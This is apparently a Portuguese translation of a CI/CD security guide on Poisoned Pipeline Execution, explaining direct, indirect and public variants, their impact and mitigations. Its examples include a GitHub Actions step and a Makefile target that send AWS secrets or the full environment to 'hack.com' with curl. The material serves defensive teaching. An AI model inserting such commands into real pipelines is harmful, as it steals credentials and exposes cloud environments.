
## Definição


Os riscos de Poisoned Pipeline Execution (PPE) referem-se à capacidade de um invasor com acesso a sistemas de controle de origem - e sem acesso ao ambiente de build, manipular o processo de build injetando códigos/comandos maliciosos na configuração do pipeline, essencialmente 'envenenando-o' e executando código malicioso como parte do processo de compilação.


## Descrição

O vetor PPE abusa das permissões contra um repositório SCM, de maneira que faz com que um pipeline de CI execute comandos maliciosos.

Os usuários que têm permissões para manipular os arquivos de configuração do CI ou outros arquivos dos quais o trabalho do pipeline depende, podem modificá-los para conter comandos maliciosos, "envenenando" o pipeline de CI que executa esses comandos.

Os pipelines que executam código não revisado, por exemplo, aqueles que são acionados diretamente por pull requests ou commits nos branches, são mais suscetíveis a PPE. O motivo é que esses cenários, por design, contêm código que não passou por nenhuma revisão ou aprovação.

Uma vez capaz de executar código malicioso dentro do pipeline de CI, o invasor pode realizar uma ampla variedade de operações maliciosas, tudo dentro do contexto da identidade do pipeline.

Existem três tipos de PPEs:

**Direct PPE (D-PPE):** em um cenário D-PPE, o invasor modifica o arquivo de configuração do CI em um repositório ao qual ele tem acesso, seja enviando a alteração diretamente para um branch desprotegido no repositório ou enviando um PR com a alteração para um branch ou fork. Como a execução do pipeline de CI é acionada pelos eventos "push" ou "PR", e a execução é definida pelos comandos no arquivo de configuração de CI modificado, os comandos maliciosos do invasor são executados no build node  assim que o pipeline é disparado.

**Indirect PPE (I-PPE):** Em certos casos, a possibilidade de D-PPE não está disponível para um adversário com acesso a um repositório SCM:


* Se o pipeline estiver configurado para fazer pull do arquivo de configuração do CI de um branch separado e protegido no mesmo repositório.
* Se o arquivo de configuração do CI estiver armazenado em um repositório separado do código-fonte, sem a opção de um usuário editá-lo diretamente.
* Se a compilação do CI for definida no próprio sistema de CI - em vez de em um arquivo armazenado no código-fonte.

Nesse cenário, o invasor ainda pode envenenar o pipeline injetando código malicioso em arquivos referenciados pelo arquivo de configuração do pipeline, por exemplo:


* _make_: Executa comandos definidos no arquivo “Makefile”.
* Scripts referenciados no arquivo de configuração do pipeline, que são armazenados no mesmo repositório que o próprio código-fonte (por exemplo, _python myscript.py_ - onde myscript.py seria manipulado pelo invasor).
* Testes de código: Os frameworks de teste executados no código do aplicativo dentro do processo de construção dependem de arquivos dedicados, armazenados no mesmo repositório que o próprio código-fonte. Os invasores que são capazes de manipular o código responsável pelo teste podem executar comandos maliciosos dentro do build.
* Ferramentas automáticas: Linters e scanners de segurança usados no CI também são comumente dependentes de um arquivo de configuração residente no repositório. Muitas vezes essas configurações envolvem carregar e executar código externo de um local definido dentro do arquivo de configuração.

Portanto, em vez de envenenar o pipeline inserindo comandos maliciosos diretamente no arquivo de definição do pipeline, no I-PPE, um invasor injeta código malicioso nos arquivos referenciados pelo arquivo de configuração. O código malicioso é finalmente executado no nó do pipeline assim que o pipeline é acionado e executa os comandos declarados nos arquivos em questão.

**Public-PPE (3PE):** A execução de um ataque PPE requer acesso ao repositório que hospeda o arquivo de configuração do pipeline ou aos arquivos aos quais ele faz referência. Na maioria dos casos, a permissão para fazê-lo seria dada aos membros da organização - principalmente desenvolvedores. Portanto, os invasores normalmente precisam ter a permissão de um desenvolvedor no repositório para executar um ataque PPE direto ou indireto.

No entanto, em alguns casos, o envenenamento de pipelines de CI está disponível para invasores anônimos na Internet: repositórios públicos (por exemplo, projetos de código aberto) muitas vezes permitem que qualquer usuário contribua - geralmente criando pull requests, sugerindo alterações no código. Esses projetos geralmente são testados e construídos automaticamente usando uma solução de CI, de maneira semelhante aos projetos privados.

Se o pipeline de CI de um repositório público executar código não revisado sugerido por usuários anônimos, ele estará suscetível a um ataque de PPE público ou, resumidamente, 3PE. Isso também expõe ativos internos, como segredos de projetos privados, nos casos em que o pipeline do repositório público vulnerável é executado na mesma instância de CI que os privados.


**Exemplos**

<span style="text-decoration:underline;">Exemplo 1: Roubo de Credencial via Direct-PPE (GitHub Actions)</span>

No exemplo a seguir, um repositório GitHub está conectado a um fluxo de trabalho do GitHub Actions que busca o código, o cria, executa testes e, por fim, implanta artefatos na AWS.

Quando um novo código é enviado para um branch do repositório, o código - incluindo o arquivo de configuração do pipeline - é obtido pelo executor (o nó do fluxo de trabalho).

```YAML
name: PIPELINE
on: push
jobs:
 build:
   runs-on: ubuntu-latest
   steps:
     - run: |
         echo "building..."
         echo "testing..."
         echo "deploying..."
```

![alt_text](assets/images/dppe.jpg)


Nesse cenário, o ataque de  D-PPE attack seria feito da seguinta forma:



1. Um invasor cria um novo Branch do repositório, na qual atualiza o arquivo de configuração do pipeline com comandos maliciosos destinados a acessar as credenciais da AWS com escopo para a organização GitHub e, em seguida, enviá-las para um servidor remoto.

```YAML
name: PIPELINE
on: push
jobs:
 build:
   runs-on: ubuntu-latest
   steps:
     - env:
         ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY_ID }}
         SECRET_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

       run: |
         curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" hack.com

```



2. Depois que a atualização é enviada, isso aciona um pipeline que busca o código do repositório, incluindo o arquivo de configuração do pipeline malicioso.
3. O pipeline é executado com base no arquivo de configuração “envenenado” pelo invasor. De acordo com os comandos maliciosos do invasor, as credenciais da AWS armazenadas como segredos do repositório são carregadas na memória.
4. O pipeline executa os comandos do invasor que enviam as credenciais da AWS para um servidor controlado pelo invasor.
5. O invasor pode usar as credenciais roubadas para acessar o ambiente de produção da AWS.

<span style="text-decoration:underline;">Example 2: Roubo de credencial via Indirect-PPE (Jenkins)</span>

Desta vez, é um pipeline do Jenkins que busca o código do repositório, o constrói, executa testes e, por fim, implanta na AWS. Neste cenário, a configuração do pipeline é tal que o arquivo que descreve o pipeline - o Jenkinsfile - é sempre obtido da branch principal do repositório, que é protegido. Portanto, o invasor não pode manipular a definição de build, o que significa que buscar segredos armazenados no armazenamento de credenciais do Jenkins ou executar o trabalho em outros nós não é uma possibilidade.

No entanto - isso não significa que o pipeline esteja livre de riscos;

No estágio _build_ do pipeline, as credenciais da AWS são carregadas como variáveis de ambiente, tornando-as disponíveis apenas para os comandos executados neste estágio. No exemplo abaixo, o comando _make_, que é baseado no conteúdo do Makefile (também armazenado no repositório), é executado como parte deste estágio.

O arquivo Jenkins:

```GROOVY
pipeline {
   agent any
   stages {
       stage('build') {
           steps {
               withAWS(credentials: 'AWS_key', region: 'us-east-1') {
                       sh 'make build'
                       sh 'make clean'
               }
           }
       }
       stage('test') {
           steps {
               sh 'go test -v ./...'
...
```


O Makefile:


```MAKEFILE
build:
   echo "building…"

clean:
   echo "cleaning…"
```

![alt_text](assets/images/ippe.jpg)

Nesse cenário, o ataque de I-PPE seria executado da seguinte forma:



1. O atacante cria pull requests no repositório, anexando comandos maliciosos ao arquivo _Makefile_ .


```MAKEFILE
build:
   curl -d "$$(env)" hack.com

clean:
   echo "cleaning…"

```



2. Como o pipeline está configurado para ser acionado em qualquer PR no repositório, o pipeline Jenkins é acionado, buscando o código do repositório, incluindo o _Makefile_ malicioso.
3. O pipeline é executado com base no arquivo de configuração armazenado na branch principal. Ele chega ao estágio _build_ e carrega as credenciais da AWS nas variáveis de ambiente - conforme definido no Jenkinsfile original. Em seguida, ele executa o comando _make build_, que executa o comando malicioso que foi adicionado ao _Makefile_.
4. A função maliciosa _build_ definida no Makefile é executada, enviando as credenciais da AWS para um servidor controlado pelo invasor.
5. O invasor pode usar as credenciais roubadas para acessar o ambiente de produção da AWS.


## Impacto

Em um ataque de PPE bem-sucedido, os invasores executam código malicioso não revisado no CI. Isso fornece ao invasor as mesmas habilidades e nível de acesso do processo de Build, incluindo:



* Acesso a qualquer segredo disponível para o job do CI, como segredos injetados como variáveis de ambiente ou segredos adicionais armazenados no CI. Sendo responsáveis por criar código e implantar artefatos, os sistemas CI/CD geralmente contêm dezenas de credenciais e tokens de alto valor - como para um provedor de nuvem, para registros de artefatos e para o próprio SCM.
* Acesso a ativos externos para os quais o nó de trabalho tem permissões, como arquivos armazenados no sistema de arquivos do nó ou credenciais para um ambiente de nuvem acessível por meio do host subjacente.
* Capacidade de enviar código e artefatos mais adiante no pipeline, disfarçado de código legítimo criado pelo processo de build.
* Capacidade de acessar hosts e ativos adicionais na rede/ambiente do nó de trabalho.


## Recomendações

Prevenir e mitigar o vetor de ataque de PPE envolve várias medidas que abrangem os sistemas SCM e CI:



* Certifique-se de que os pipelines que executam código não revisado sejam executados em nós isolados, não expostos a segredos e ambientes confidenciais.
* Avalie a necessidade de acionar pipelines em repositórios públicos de contribuidores externos. Sempre que possível, evite executar pipelines originados de bifurcações e considere adicionar controles, como exigir aprovação manual para execução de pipeline.
* Para pipelines confidenciais, por exemplo, aqueles expostos a segredos, certifique-se de que cada branch configurada para acionar um pipeline no sistema CI tenha uma regra de proteção de branch correspondente no SCM.
* Para evitar a manipulação do arquivo de configuração do CI para executar código malicioso no pipeline, cada arquivo de configuração do CI deve ser revisado antes da execução do pipeline. Como alternativa, o arquivo de configuração do CI pode ser gerenciado em uma branch remota, separada da ramificação que contém o código que está sendo criado no pipeline. A branch remota deve ser configurada como protegida.
* Remova as permissões concedidas no repositório SCM de usuários que não precisam delas.
* Cada pipeline deve ter acesso apenas às credenciais necessárias para cumprir sua finalidade. As credenciais devem ter os privilégios mínimos necessários.

## Referências 



1. Exploiting Continuous Integration and Automated Build systems, DEF CON 25, by Tyler Welton. The talk covered exploitation techniques of the Direct-PPE and 3PE attack vectors, targeting pipelines running unreviewed code.

    [https://www.youtube.com/watch?v=mpUDqo7tIk8](https://www.youtube.com/watch?v=mpUDqo7tIk8)

2. PPE - Poisoned Pipeline Execution. Running malicious code in your CI, without access to your CI. By [Daniel Krivelevich](https://twitter.com/Dkrivelev) and [Omer Gil](https://twitter.com/omer_gil).

    [https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/](https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/)

3. Build Pipeline Security, by [xssfox](https://twitter.com/xssfox). An Indirect-PPE vulnerability was exposed in the CodeBuild pipeline of a website belonging to AWS. This allowed anonymous attackers to modify a script executed by the build configuration file with the creation of a pull request, resulting in the compromise of deployment credentials.

    [https://sprocketfox.io/xssfox/2021/02/18/pipeline/](https://sprocketfox.io/xssfox/2021/02/18/pipeline/)

4. GitHub Actions abused to mine cryptocurrency by pull requests that contained malicious code.

    [https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc](https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc)

5. A terraform provider for execution of OS commands during run of _terraform plan_ in the pipeline, by [Hiroki Suezawa](https://twitter.com/rung).

    [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

6. Abusing the _terraform plan_ command for execution of OS commands in the CI/CD, by [Alex Kaskasoli](https://twitter.com/alxk7i).

    [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

7. A vulnerability found in Teleport’s CI implementation, that allowed attackers from the internet to execute a Direct-3PE attack by creating a pull request in a public GitHub repository linked with a Drone CI pipeline, and modifying the CI configuration file to execute a malicious pipeline.

    [https://goteleport.com/blog/hack-via-pull-request/](https://goteleport.com/blog/hack-via-pull-request/)

8. Research by Asier Rivera Fernandez showed how a PPE attack against a CI/CD environment including CodePipeline, CodeBuild and CodeDeploy services in AWS could be executed.

    [https://www.youtube.com/watch?v=McZBcMRxPTA](https://www.youtube.com/watch?v=McZBcMRxPTA)
    [https://www.pwc.be/en/FY21/documents/AWS%20CI_CD%20technical%20article%20-%20v3.pdf](https://www.pwc.be/en/FY21/documents/AWS%20CI_CD%20technical%20article%20-%20v3.pdf)
